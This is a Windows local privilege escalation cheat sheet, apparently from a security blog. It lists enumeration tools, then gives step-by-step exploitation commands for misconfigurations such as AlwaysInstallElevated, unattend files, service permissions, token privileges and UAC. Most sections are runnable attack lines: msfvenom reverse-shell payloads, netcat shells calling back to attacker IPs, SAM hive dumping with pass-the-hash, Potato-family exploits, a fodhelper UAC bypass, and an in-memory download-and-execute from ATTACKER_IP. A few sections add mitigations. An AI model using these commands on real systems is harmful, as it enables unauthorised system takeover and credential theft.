---
title: Windows Local Privilege Escalation
author: Kasem Shibli
date: 2025-10-27 18:41:00 +/-TTTT
categories: [CheetSheets]
tags: [Windows LPE]
---
🛠️ Under Constructions
## Useful Tools

In the following table, some popular and useful tools for Windows local privilege escalation are presented:

| Name | Language | Author | Description |
|:-----------:|:-----------:|:-----------:|:-----------:|
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# | [@harmj0y](https://twitter.com/harmj0y) | SharpUp is a C# port of various PowerUp functionality |
| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | PowerShell | [@harmj0y](https://twitter.com/harmj0y) | PowerUp aims to be a clearinghouse of common Windows privilege escalation |
| [Privesc](https://github.com/enjoiz/Privesc) | PowerShell | [enjoiz](https://github.com/enjoiz) | Windows PowerShell script that finds misconfiguration issues which can lead to privilege escalation |
| [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) | C# | [@hacktricks_live](https://twitter.com/hacktricks_live) | Windows local Privilege Escalation Awesome Script |
| [PrivescCheck](https://github.com/itm4n/PrivescCheck) | PowerShell | [@itm4n](https://twitter.com/itm4n) | Privilege Escalation Enumeration Script for Windows |

## AlwaysInstallElevated
### Manual Enumeration
```powershell
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Tool Enumeration
```powershell
$ SharpUp.exe audit AlwaysInstallElevated
```
### Exploitation
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=9001 -f msi > backdoor.msi
```
```powershell
execute on windows
$ msiexec /quiet /qn /i backdoor.msi
```
### Mitigation
To mitigate the `AlwaysInstallElevated` vulnerability, it is recommended to set the `AlwaysInstallElevated` value to `0` in both the `HKEY_LOCAL_MACHINE` and `HKEY_CURRENT_USER` hives in the Windows Registry.

## Answer files (Unattend files)

### Manual Enumeration
```powershell
$ Write-Host `n;foreach ($file in @('C:\Windows\Panther\unattend.xml', 'C:\Windows\Panther\Unattend\unattend.xml', 'C:\Windows\System32\Sysprep\unattend.xml', 'C:\Windows\System32\Sysprep\sysprep.xml', 'C:\Windows\System32\Sysprep\Panther\unattend.xml', 'C:\Windows\sysprep.inf', 'C:\Windows\unattend.xml', 'C:\unattend.xml', 'C:\sysprep.inf')) { if (Test-Path $file) { Write-Host "[+] $file" } }; Write-Host `n
```
### Tool Enumeration
```powershell
$ SharpUp.exe audit UnattendedInstallFiles
```
### Exploitation
```powershell
1-  Read the content of the found answer file:
$ type  C:\Windows\Panther\Unattend\Unattend.xml

2- decode the base64 password field
$ echo "<base64 string>" | base64 -d
```

## Leaked Credentials (GitHub Repository)
```powershell
$ git log
```
![Github-Enumeration](/images/cheatsheets/Windows-LPE/Github-Enumeration.png)
```powershell
$ git diff <commit-id-1> <commit-id-2>
```
![Github-Enumeration](/images/cheatsheets/Windows-LPE/Github-Enumeration-2.png)
```powershell
$ git show
```
![Github-Enumeration](/images/cheatsheets/Windows-LPE/Github-Enumeration-3.png)

## Leaked Credentials (PowerShell History)
```powershell
$ C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
### Mitigation
```powershell
$ Clear-Content -Path "C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

## Logon Autostart Execution (Registry Run Keys)
### Manual Enumeration
```powershell
$ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
![](/images/cheatsheets/Windows-LPE/RegistryAutoruns-Manual.png)
### Tool Enumeration
```powershell
$ SharpUp.exe audit RegistryAutoruns
```
![](/images/cheatsheets/Windows-LPE/RegistryAutoruns-SharpUp.png)
## Exploitation
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.10.15 lport=9001 -f exe > shell.exe
```
Rename the malicious exe (shell.exe) to 'NCV_AMD64.exe'.<br>
Open a listener on your Kali machine.<br>
Reboot the victim's machine and login as Adminstrator:
### Mitigation
```powershell
$ reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "<KeyName>" /f
```

## Logon Autostart Execution (Startup Folder)
```powershell
$ icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
### Tool Enumeration
```powershell
$ accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
### Exploitation
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.10.15 lport=9001 -f exe > shell.exe
```
Move the malicious executable file to 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'.<br>
Open a listener on your Kali machine.<br>
Reboot the victim's machine and login as Adminstrator:
### Mitigation
```powershell
$ takeown /F "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /A /R /D Y
$ icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /reset /T /C /Q
```
## SeBackupPrivilege
### Enumeration
```powershell
$ whoami /priv
$ SharpUp.exe audit TokenPrivileges
```
### Exploitation
```powershell
$ mkdir C:\temp
$ reg save hklm\sam C:\temp\sam.hive
$ reg save hklm\system C:\temp\system.hive
$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
$ evil-winrm -i <ip> -u "Administrator" -H "<hash>"
```
## SeImpersonatePrivilege
### Enumeration
```powershell
$ whoami /priv
$ SharpUp.exe audit TokenPrivileges
```
### Exploitation
[PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
```powershell
$ PrintSpoofer64.exe -i -c cmd
```
## Potato Family JuicyPotato

### JuicyPotatoNG

```bash

JuicyPotatoNG.exe -t * -p C:\windows\system32\cmd.exe -a "/c C:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.16.48 9002"
```

### **PrintSpoofer**

```bash
# can use -i to inject to same process
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"
```

### **RoguePotato**

```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999

# If outbound 135 is blocked, pivot the OXID resolver via socat on your redirector:
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999

```

### **SharpEfsPotato**

```bash
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
# we cat the w.log  
type C:\temp\w.log
nt authority\system
```

### **EfsPotato**

```bash
# output will be nt authority\system
EfsPotato.exe "whoami"

# If one pipe fails or EDR blocks it, try the other supported pipes:
EfsPotato <cmd> [pipe]
	pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### **GodPotato**

```bash
# Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.
GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"

```

### **DCOMPotato**

```bash
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"

```

### **SigmaPotato**

```bash
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))

```

### **CLSID Problems**

```bash
# Oftentimes default CLSID that JuicyPotato uses doesn't work 
https://ohpe.it/juicy-potato/CLSID/
```

### **Checking CLSIDs**

```bash
# Download Join-Object.ps1 and load it
https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1

# download and execute 
https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1

# trying every CLSID  when the port number changes, it will mean that the CLSID worked.
# Check the working CLSIDs using the parameter -c
https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat
```

## Stored Credentials (Runas)
### Enumeration
```powershell
$ cmdkey /list
```
### Exploitaion
```bash
- on attacker:
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=9001 -f exe > mallicous.exe

- on victim:
$ runas /savecred /user:WORKGROUP\Administrator "C:\Windows\Tasks\mallicous.exe"
```
## UAC Bypass
### Enumeration
```powershell
$ reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
### Tool Enumeration
```powershell
$ SharpUp.exe audit
```
### Exploitation
ℹ️ This case study leverages a UAC384 bypass that abuses the Fodhelper.exe application
```bash
on attacker:
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.10.15 lport=9001 -f exe > mallicous.exe

on victim:
$ New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
$ New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
$ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -exec bypass -c C:\<full_path>\<binary.exe>" -Force
C:\Windows\System32\fodhelper.exe
```
## Unquoted Service Path
### Enumeration
```powershell
$ wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
$ sc qc "Vulnerable Service 1"
$ icacls "C:\Program Files\Vulnerable Service1"
```
### Tool Enumeration
```powershell
$ SharpUp.exe audit UnquotedServicePath
```
![](/images/cheatsheets/Windows-LPE/Unquoted-Service-Tool-Enumeration.png)
### Exploitation
```powershell
$ sc query "Vulnerable Service 1"

on attacker:
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=9001 -f exe > Service.exe

on victim:
$ iwr -Uri http://<ip>:<port>/Service.exe -Outfile "C:\Program Files\Vulnerable Service1\Service.exe"
$ sc stop "Vulnerable Service 1"
$ sc start "Vulnerable Service 1"
```
## Weak Registry Permissions
### Enumeration
```powershell
Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4" | fl
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4"
```
### Tool Enumeration
```powershell
SharpUp.exe audit ModifiableServiceRegistryKeys
```
### Exploitation
```bash
on attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=9001 -f exe > Service4.exe
nc -lnvp 9001

on victim:
iwr -Uri http://<ip>:<port>/Service4.exe -Outfile C:\Windows\Tasks\Service4.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\Tasks\Service4.exe" /f
sc start "Vulnerable Service 4"
```

### Mitigation
```powershell
Automated Script
# Define the registry key path
$regKey = "HKLM:\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4"

# Get the current ACL (Access Control List) for the registry key
$acl = Get-Acl -Path $regKey

# Specify the account and access rights to be removed
$account = "BUILTIN\Users"
$accessRights = [System.Security.AccessControl.RegistryRights]::FullControl

# Create a new access rule to remove FullControl
$accessRule = New-Object System.Security.AccessControl.RegistryAccessRule($account, $accessRights, "Deny")

# Remove the access rule from the ACL
$acl.RemoveAccessRule($accessRule)

# Set the modified ACL back to the registry key
Set-Acl -Path $regKey -AclObject $acl
```
## Weak Service Binary Permissions
### Enumeration
```powershell
icacls "C:\Program Files\CustomSrv2\Service2.exe"
```
![](/images/cheatsheets/Windows-LPE/Weak-Service-Binary-Manual-Enumeration.png)
```
sc qc "Vulnerable Service 2"
```
![](/images/cheatsheets/Windows-LPE/Weak-Service-Binary-Manual-Enumeration-Part-2.png)

### Tool Enumeration
```powershell
$ SharpUp.exe audit ModifiableServiceBinaries
```
### Exploitation
```powershell
$ sc stop "Vulnerable Service 2"

on attacker:
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=9001 -f exe > Service2.exe

on victim:
$ iwr -Uri http://<ip>:<port>/Service2.exe -Outfile C:\Program Files\CustomSrv2\Service2.exe
$ sc start "Vulnerable Service 2"
```
### Mitigation
```powershell
icacls "C:\Program Files\CustomSrv2\Service2.exe" /remove:g BUILTIN\Users:(M)
```

